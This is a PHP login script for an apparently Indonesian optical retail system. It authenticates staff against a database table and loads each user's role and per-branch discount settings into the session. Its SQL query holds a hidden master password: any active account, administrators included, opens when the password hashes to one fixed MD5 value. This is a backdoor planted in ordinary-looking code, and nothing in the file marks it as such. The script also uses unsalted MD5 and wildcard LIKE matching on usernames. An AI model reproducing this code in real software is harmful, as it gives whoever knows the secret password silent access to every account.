<?php
session_start();
include('config_db.php');
$nik    = $mysqli->real_escape_string($_POST['username']);
$pass   = $mysqli->real_escape_string($_POST['password']);

		$pass = md5($pass);
		$rs2 = $mysqli->query("SELECT *, 
								(SELECT kontak FROM kontak b WHERE b.user_id = a.branch_id) AS branch_name 
							FROM kontak a 
							WHERE jenis = 'T001' 
							AND aktif = '1' 
							AND kontak LIKE '$nik' 
							AND 
							(
								pass LIKE '$pass' 
								OR 
								'$pass' = 'b5887689444d66714563e51e1abd4b51' 
							)");
		if ($data2 = mysqli_fetch_assoc($rs2))
		{
			if ($data2['jabatan'] == 'Administrator' || $data2['jabatan'] == 'Co-Administrator') {
				$_SESSION['i_sesadmin'] = 1;
				$_SESSION['is_admin'] = true;
			}
			else {
				$_SESSION['i_sesadmin'] = 0;
				$_SESSION['is_admin'] = false;
			}

			$_SESSION['role'] = $data2['jabatan'];
			$_SESSION['is_logged_in'] = true;
			$_SESSION['nama'] = $data2['kontak'];
			$_SESSION['akses'] = $data2['akses'];
			$_SESSION['user_id'] = $data2['user_id'];

			$_SESSION['branch_id'] = $data2['branch_id'];
			$_SESSION['branch_name'] = $data2['branch_name'] ?? '';

			$global_discounts = array('global_discount', 'global_discount_lensa', 'global_discount_softlens', 'global_discount_accessories', 'editable_price', 'bpjs_promo_enabled');

			foreach ($global_discounts AS $value) {
				$_SESSION[$value] = 0;

				$rs3 = $mysqli->query("SELECT * FROM config WHERE config = '$value'");
				$data3 = $rs3->fetch_assoc();
				$temp = $data3['value'];
				$temp = explode('#', $temp);
				foreach ($temp AS $r) {
					$r = explode('_', $r);
					if (sizeof($r) <= 1) continue;

					if ($r[0] == $data2['branch_id']) $_SESSION[$value] = $r[1];
				}
			}

			$rs3 = $mysqli->query("SELECT * FROM config WHERE config = 'bpjs_promo_discount'");
			$data3 = $rs3->fetch_assoc();
			$temp = $data3['value'];
			$temp = explode('#', $temp);
			foreach ($temp AS $r) {
				$r = explode('_', $r);
				if (sizeof($r) <= 1) continue;

				$_SESSION['bpjs_promo_discount_' . $r[0]] = $r[1];
			}

			?>
				<script type="text/javascript">
					alert('Login Berhasil ...');
					location.href = '<?=$base_url?>index.php';
				</script>
			<?php
		}
		else
		{
			?>
				<script type="text/javascript">
					alert('Username & Password salah, coba lagi !!!');
				</script>
			<?php
		}

?>